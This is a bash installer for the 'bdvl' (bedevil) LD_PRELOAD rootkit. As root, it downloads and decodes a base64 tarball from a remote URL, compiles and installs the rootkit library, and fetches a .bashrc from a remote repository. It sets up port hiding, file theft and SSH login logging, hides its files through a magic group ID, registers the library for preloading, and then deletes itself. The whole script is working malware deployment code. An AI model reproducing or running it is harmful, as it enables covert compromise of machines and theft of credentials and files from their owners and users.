#!/bin/bash

# installation script that bases installation off of a pre-configured &
# base64'd tar.gz. typed this up in the space of about 30m-1hr.
# 
# reads & downloads base64'd tar.gz file from a url. this file is
# created by bedevil.sh when a new include directory is compressed.
#   i.e.: ./bedevil.sh -zd
# this new file is written as '[...].so.inc.b64' but you can name it whatever
# you like. this script doesn't rely on the new file having a specific name.
# 
# written as base64 just for the sake of easy transfer. i.e, through netcat or
# something similar. this script depends on the 'settings' file that is written
# to the include directory upon compression. if the format of that file is incorrect,
# this script will have a heart attack and do things VERY wrong.
# 
# the contents of the 'settings' file is just what etc/defaults.sh declares
# for its/your variables. not everything in that file will be useful to you.
# for exmaple SSH_LOGS or INTEREST_DIR. that's why i've added some user specific
# settings, see below. (ESSENTIAL SETTINGS)

# example setup file (INSTALL_DIR=/tmp/install_test, LDSO_PRELOAD=/tmp/fakepreload):
#   https://pastebin.com/raw/jegd2JuV

# ESSENTIAL SETTINGS THAT MUST BE EDITED DEPENDING ON YOUR SETUP:
# USES TYPICAL BINARY VALUES.
ACCEPT_USE_SSL=0
USE_CRYPT=0

DO_HIDESELF=0
SETUP_HIDEPORTS=0
SETUP_FILE_STEAL=0
SETUP_LOG_SSH=0
# END OF CONFIGURATION-SPECIFIC SETTINGS

bin_path(){ echo -n `which $1 2>/dev/null || echo -n "nahhh"`; }

SCRIPT_PATH="`pwd`/$0" && echo "$SCRIPT_PATH"

# do prerequisite checks now
[ `id -u` != 0 ] && { echo "not root" && exit; }
[ ! -f `bin_path tar` ] && { echo "missing tar. install it." && exit; }
[ ! -f `bin_path base64` ] && { echo "missing base64 util, install it." && exit; }
[ -z $1 ] && exit

DWNLDR=""
[ -f `bin_path wget` ] && DWNLDR="wget"
[ -f `bin_path curl` ] && [ -z $DWNLDR ] && DWNLDR="curl"
[ -z $DWNLDR ] && { echo "you need wget or curl... install either." && exit; }

echo "beginning setup & installation of bdvl using $0"
echo "   before you continue, make sure that any dependencies"
echo "   that are required by your setup of bdvl are installed"
echo "   on this box. failure to do so will mess everything up."
echo "press enter to continue."
read

TARGZ_URL="$1" && echo "got url $TARGZ_URL"

[[ "$TARGZ_URL" != *"/"* ]] && { echo "no path in url." && exit; }
[[ "$TARGZ_URL" == "http"* ]] && HOST="`echo -n "$TARGZ_URL" | awk -F/ '{print $3}'`"
[[ "$TARGZ_URL" != "http"* ]] && HOST="`echo -n "$TARGZ_URL" | awk -F/ '{print $1}'`"
echo "got host $HOST"

echo "seeing if host is actually up"
ping -c 1 $HOST >/dev/null || { echo "no response from host... why?" && exit; }
echo "host up, starting download"

TARGZ_B64NAME="`basename $TARGZ_URL`" && echo "b64'd archive name: $TARGZ_B64NAME"
TARGZ_NAME="${TARGZ_B64NAME::${#TARGZ_B64NAME}-4}.tar.gz"
echo "archive name: $TARGZ_NAME"

echo "entering /tmp" && cd /tmp && echo "downloading b64 tarball"
[ $DWNLDR == "wget" ] && wget $TARGZ_URL -O $TARGZ_B64NAME >/dev/null || curl $TARGZ_URL -o $TARGZ_B64NAME >/dev/null
echo "reverting b64'd tarball back to regular tarball"
cat $TARGZ_B64NAME | base64 -d > $TARGZ_NAME || { echo "something went wrong converting b64 to original" && exit; }
[ ! -f $TARGZ_NAME ] && { echo "$TARGZ_NAME doesn't exist for whatever reason. exiting." && exit; }

INCLUDE_DIR="`tar -tzf $TARGZ_NAME | head -1 | cut -f1 -d"/"`"
echo "got $TARGZ_NAME. extracting it..."
tar xvpfz $TARGZ_NAME >/dev/null && echo "tarball extracted, removing it" && rm $TARGZ_NAME && rm $TARGZ_B64NAME

echo "got $INCLUDE_DIR, reading settings from $INCLUDE_DIR/settings"
settings=(`cat $INCLUDE_DIR/settings | grep -o '^[^#]*'`)
MAGIC_GID=${settings[0]} && INSTALL_DIR=${settings[1]}
LDSO_PRELOAD=${settings[2]} && BDVLSO=${settings[3]}
SOPATH=${settings[4]} && HIDEPORTS=${settings[5]}
SSH_LOGS=${settings[6]} && INTEREST_DIR=${settings[7]}
BD_VAR=${settings[8]}

echo "MAGIC_GID = $MAGIC_GID" && echo "INSTALL_DIR = $INSTALL_DIR"
echo "LDSO_PRELOAD = $LDSO_PRELOAD" && echo "BDVLSO = $BDVLSO"
echo "SOPATH = $SOPATH" && echo "HIDEPORTS = $HIDEPORTS"
echo "SSH_LOGS = $SSH_LOGS" && echo "INTEREST_DIR = $INTEREST_DIR"
echo "BD_VAR = $BD_VAR"

echo "all good, beginning installation"

echo "compiling bdvl"
LINKER_FLAGS=(-ldl)
[ $USE_CRYPT == 1 ] && LINKER_FLAGS+=(-lcrypt)
[ $ACCEPT_USE_SSL == 1 ] && LINKER_FLAGS+=(-lssl)
WARNING_FLAGS="-Wall" && OPTIMIZATION_FLAGS="-O0 -g0"
OPTIONS="-fomit-frame-pointer -fPIC" && LINKER_OPTIONS="-Wl,--build-id=none"
PLATFORM="`uname -m`"
[ $PLATFORM == "armv7l" ] && PLATFORM="v7l"
[ $PLATFORM == "armv6l" ] && PLATFORM="v6l"
gcc -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS \
-I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS \
-I$INCLUDE_DIR -shared ${LINKER_FLAGS[*]} $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null

strip $BDVLSO.$PLATFORM 2>/dev/null || { echo "couldn't strip $BDVLSO.$PLATFORM, exiting"; exit; }
strip $BDVLSO.i686 2>/dev/null

echo "rootkit successfully compiled"
echo "installing to \$INSTALL_DIR"
[ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR/
mv $BDVLSO.$PLATFORM $INSTALL_DIR/$BDVLSO.$PLATFORM
[ -f $BDVLSO.i686 ] && mv $BDVLSO.i686 $INSTALL_DIR/$BDVLSO.i686

echo "rootkit installed to install dir..."
echo "now preparing our home before preloading the rootkit."

echo "downloading .bashrc from rootkit repo"
BASHRC_LOCATION="https://raw.githubusercontent.com/naworkcaj/bdvl/master/etc/.bashrc"
[ $DWNLDR == "wget" ] && wget $BASHRC_LOCATION -O $INSTALL_DIR/.bashrc >/dev/null
[ $DWNLDR == "curl" ] && curl $BASHRC_LOCATION -o $INSTALL_DIR/.bashrc >/dev/null
echo "setting up .bashrc for you"
[ -f $INSTALL_DIR/.bashrc ] && echo -n ". .bashrc" > $INSTALL_DIR/.profile

echo "preparing the rest of the installation directory"
[ $SETUP_HIDEPORTS == 1 ] && { touch $HIDEPORTS && chmod 666 $HIDEPORTS && ln -s $HIDEPORTS $INSTALL_DIR/hideports && cat $INCLUDE_DIR/hideports > $INSTALL_DIR/hideports; }
[ $SETUP_FILE_STEAL == 1 ] && { mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR && ln -s $INTEREST_DIR $INSTALL_DIR/interest_dir; }
[ $SETUP_LOG_SSH == 1 ] && { touch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; } 
if [ $DO_HIDESELF == 1 ]; then
    echo "hiding all rootkit files"

    HIDE_FILES+=($LDSO_PRELOAD $INSTALL_DIR $INSTALL_DIR/*)

    [ -f $INSTALL_DIR/.bashrc ] && HIDE_FILES+=($INSTALL_DIR/.profile)
    [ $SETUP_LOG_SSH == 1 ] && HIDE_FILES+=($SSH_LOGS)
    [ $SETUP_FILE_STEAL == 1 ] && HIDE_FILES+=($INTEREST_DIR)
    [ $SETUP_HIDEPORTS == 1 ] && HIDE_FILES+=($HIDEPORTS)

    for file in ${HIDE_FILES[@]}; do
        [ ! -f $file ] && touch $file
        chown -h 0:$MAGIC_GID $file
    done
fi

echo "finished with the install dir, writing \$SOPATH to \$LDSO_PRELOAD"
echo -n "$SOPATH" > $LDSO_PRELOAD && echo && echo "installation finished. now proceeding to clean up"

rm -r $INCLUDE_DIR $SCRIPT_PATH && echo "everything cleaned up" && echo